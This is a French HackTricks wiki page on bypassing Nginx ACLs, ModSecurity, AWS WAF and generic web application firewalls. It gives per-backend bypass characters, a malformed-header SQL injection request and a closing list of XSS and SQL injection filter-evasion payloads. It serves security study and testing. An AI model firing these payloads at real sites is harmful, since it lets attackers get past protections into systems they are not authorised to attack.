# Proxy / WAF Protections Bypass

{% hint style="success" %}
Apprenez et pratiquez le hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Bypass des r√®gles ACL Nginx avec manipulation de chemin <a href="#heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules" id="heading-pathname-manipulation-bypassing-reverse-proxies-and-load-balancers-security-rules"></a>

Techniques [de cette recherche](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies).

Exemple de r√®gle Nginx :
```plaintext
location = /admin {
deny all;
}

location = /admin/ {
deny all;
}
```
Pour √©viter les contournements, Nginx effectue une normalisation des chemins avant de les v√©rifier. Cependant, si le serveur backend effectue une normalisation diff√©rente (en supprimant des caract√®res que Nginx ne supprime pas), il pourrait √™tre possible de contourner cette d√©fense.

### **NodeJS - Express**

| Version Nginx | **Caract√®res de contournement Node.js** |
| ------------- | --------------------------------------- |
| 1.22.0        | `\xA0`                                  |
| 1.21.6        | `\xA0`                                  |
| 1.20.2        | `\xA0`, `\x09`, `\x0C`                  |
| 1.18.0        | `\xA0`, `\x09`, `\x0C`                  |
| 1.16.1        | `\xA0`, `\x09`, `\x0C`                  |

### **Flask**

| Version Nginx | **Caract√®res de contournement Flask**                             |
| ------------- | --------------------------------------------------------------- |
| 1.22.0        | `\x85`, `\xA0`                                                  |
| 1.21.6        | `\x85`, `\xA0`                                                  |
| 1.20.2        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.18.0        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |
| 1.16.1        | `\x85`, `\xA0`, `\x1F`, `\x1E`, `\x1D`, `\x1C`, `\x0C`, `\x0B` |

### **Spring Boot**

| Version Nginx | **Caract√®res de contournement Spring Boot** |
| ------------- | -------------------------------------------- |
| 1.22.0        | `;`                                          |
| 1.21.6        | `;`                                          |
| 1.20.2        | `\x09`, `;`                                  |
| 1.18.0        | `\x09`, `;`                                  |
| 1.16.1        | `\x09`, `;`                                  |

### **PHP-FPM**

Configuration FPM Nginx :
```plaintext
location = /admin.php {
deny all;
}

location ~ \.php$ {
include snippets/fastcgi-php.conf;
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
}
```
Nginx est configur√© pour bloquer l'acc√®s √† `/admin.php`, mais il est possible de contourner cela en acc√©dant √† `/admin.php/index.php`.

### Comment pr√©venir
```plaintext
location ~* ^/admin {
deny all;
}
```
## Bypass Mod Security Rules <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Path Confusion

[**Dans cet article**](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/) il est expliqu√© que ModSecurity v3 (jusqu'√† 3.0.12), **a mal impl√©ment√© la variable `REQUEST_FILENAME`** qui √©tait cens√©e contenir le chemin acc√©d√© (jusqu'au d√©but des param√®tres). Cela est d√ª au fait qu'il effectuait un d√©codage d'URL pour obtenir le chemin.\
Par cons√©quent, une requ√™te comme `http://example.com/foo%3f';alert(1);foo=` dans mod security supposera que le chemin est juste `/foo` parce que `%3f` est transform√© en `?` terminant le chemin URL, mais en r√©alit√© le chemin que le serveur recevra sera `/foo%3f';alert(1);foo=`.

Les variables `REQUEST_BASENAME` et `PATH_INFO` ont √©galement √©t√© affect√©es par ce bug.

Quelque chose de similaire s'est produit dans la version 2 de Mod Security qui a permis de contourner une protection emp√™chant l'utilisateur d'acc√©der √† des fichiers avec des extensions sp√©cifiques li√©es aux fichiers de sauvegarde (comme `.bak`) simplement en envoyant le point encod√© en URL `%2e`, par exemple : `https://example.com/backup%2ebak`.

## Bypass AWS WAF ACL <a href="#heading-bypassing-aws-waf-acl" id="heading-bypassing-aws-waf-acl"></a>

### Malformed Header

[Cette recherche](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies) mentionne qu'il √©tait possible de contourner les r√®gles AWS WAF appliqu√©es sur les en-t√™tes HTTP en envoyant un en-t√™te "malform√©" qui n'√©tait pas correctement analys√© par AWS mais l'√©tait par le serveur backend.

Par exemple, en envoyant la requ√™te suivante avec une injection SQL dans l'en-t√™te X-Query :
```http
GET / HTTP/1.1\r\n
Host: target.com\r\n
X-Query: Value\r\n
\t' or '1'='1' -- \r\n
Connection: close\r\n
\r\n
```
Il √©tait possible de contourner AWS WAF car il ne comprenait pas que la ligne suivante faisait partie de la valeur de l'en-t√™te tandis que le serveur NODEJS le faisait (cela a √©t√© corrig√©).

## Contournements g√©n√©riques de WAF

### Limites de taille de requ√™te

Les WAF ont g√©n√©ralement une certaine limite de longueur des requ√™tes √† v√©rifier et si une requ√™te POST/PUT/PATCH d√©passe cette limite, le WAF ne v√©rifiera pas la requ√™te.

* Pour AWS WAF, vous pouvez [**v√©rifier la documentation**](https://docs.aws.amazon.com/waf/latest/developerguide/limits.html)**:**

<table data-header-hidden><thead><tr><th width="687"></th><th></th></tr></thead><tbody><tr><td>Taille maximale d'un corps de requ√™te web pouvant √™tre inspect√© pour les protections Application Load Balancer et AWS AppSync</td><td>8 Ko</td></tr><tr><td>Taille maximale d'un corps de requ√™te web pouvant √™tre inspect√© pour les protections CloudFront, API Gateway, Amazon Cognito, App Runner et Verified Access**</td><td>64 Ko</td></tr></tbody></table>

* D'apr√®s [**la documentation Azure**](https://learn.microsoft.com/en-us/azure/web-application-firewall/ag/application-gateway-waf-request-size-limits)**:**

Les anciens pare-feu d'application web avec le Core Rule Set 3.1 (ou inf√©rieur) permettent des messages plus grands que **128 Ko** en d√©sactivant l'inspection du corps de la requ√™te, mais ces messages ne seront pas v√©rifi√©s pour des vuln√©rabilit√©s. Pour les versions plus r√©centes (Core Rule Set 3.2 ou plus r√©centes), la m√™me chose peut √™tre faite en d√©sactivant la limite maximale du corps de la requ√™te. Lorsqu'une requ√™te d√©passe la limite de taille :

Si **mode de pr√©vention** : Journalise et bloque la requ√™te.\
Si **mode de d√©tection** : Inspecte jusqu'√† la limite, ignore le reste et journalise si le `Content-Length` d√©passe la limite.

* D'apr√®s [**Akamai**](https://community.akamai.com/customers/s/article/Can-WAF-inspect-all-arguments-and-values-in-request-body?language=en_US)**:**

Par d√©faut, le WAF inspecte seulement les premiers 8 Ko d'une requ√™te. Il peut augmenter la limite jusqu'√† 128 Ko en ajoutant des m√©tadonn√©es avanc√©es.

* D'apr√®s [**Cloudflare**](https://developers.cloudflare.com/ruleset-engine/rules-language/fields/#http-request-body-fields)**:**

Jusqu'√† 128 Ko.

### Obfuscation <a href="#obfuscation" id="obfuscation"></a>
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
### Compatibilit√© Unicode <a href="#unicode-compatability" id="unicode-compatability"></a>

Selon l'impl√©mentation de la normalisation Unicode (plus d'infos [ici](https://jlajara.gitlab.io/Bypass\_WAF\_Unicode)), les caract√®res qui partagent la compatibilit√© Unicode peuvent √™tre capables de contourner le WAF et de s'ex√©cuter comme le payload pr√©vu. Des caract√®res compatibles peuvent √™tre trouv√©s [ici](https://www.compart.com/en/unicode).

#### Exemple <a href="#example" id="example"></a>
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
Ôºúimg src‚Åºp onerror‚ÅºÔºáprompt‚ÅΩ1‚ÅæÔºáÔπ•  --> Ôºúimg src=p onerror='prompt(1)'>
```
### H2C Smuggling <a href="#ip-rotation" id="ip-rotation"></a>

{% content-ref url="h2c-smuggling.md" %}
[h2c-smuggling.md](h2c-smuggling.md)
{% endcontent-ref %}

### Rotation IP <a href="#ip-rotation" id="ip-rotation"></a>

* [https://github.com/ustayready/fireprox](https://github.com/ustayready/fireprox) : G√©n√©rer une URL de passerelle API √† utiliser avec ffuf
* [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin) : Similaire √† fireprox
* [https://github.com/PortSwigger/ip-rotate](https://github.com/PortSwigger/ip-rotate) : Plugin Burp Suite qui utilise des IP de passerelle API
* [https://github.com/fyoorer/ShadowClone](https://github.com/fyoorer/ShadowClone) : Un nombre d√©termin√© dynamiquement d'instances de conteneurs est activ√© en fonction de la taille du fichier d'entr√©e et du facteur de division, le fichier d'entr√©e √©tant divis√© en morceaux pour une ex√©cution parall√®le, comme 100 instances traitant 100 morceaux d'un fichier d'entr√©e de 10 000 lignes avec un facteur de division de 100 lignes.

### Contournements Regex

Diff√©rentes techniques peuvent √™tre utilis√©es pour contourner les filtres regex sur les pare-feu. Les exemples incluent l'alternance de casse, l'ajout de sauts de ligne et l'encodage des charges utiles. Des ressources pour les divers contournements peuvent √™tre trouv√©es sur [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) et [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS\_Filter\_Evasion\_Cheat\_Sheet.html). Les exemples ci-dessous ont √©t√© extraits [de cet article](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2).
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## Outils

* [**nowafpls**](https://github.com/assetnote/nowafpls) : Plugin Burp pour ajouter des donn√©es inutiles aux requ√™tes afin de contourner les WAF par la longueur

## R√©f√©rences

* [https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies](https://rafa.hashnode.dev/exploiting-http-parsers-inconsistencies)
* [https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/](https://blog.sicuranext.com/modsecurity-path-confusion-bugs-bypass/)
* [https://www.youtube.com/watch?v=0OMmWtU2Y\_g](https://www.youtube.com/watch?v=0OMmWtU2Y\_g)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Apprenez et pratiquez le Hacking AWS :<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Apprenez et pratiquez le Hacking GCP : <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Soutenir HackTricks</summary>

* Consultez les [**plans d'abonnement**](https://github.com/sponsors/carlospolop) !
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez-nous sur** **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Partagez des astuces de hacking en soumettant des PRs aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
{% endhint %}
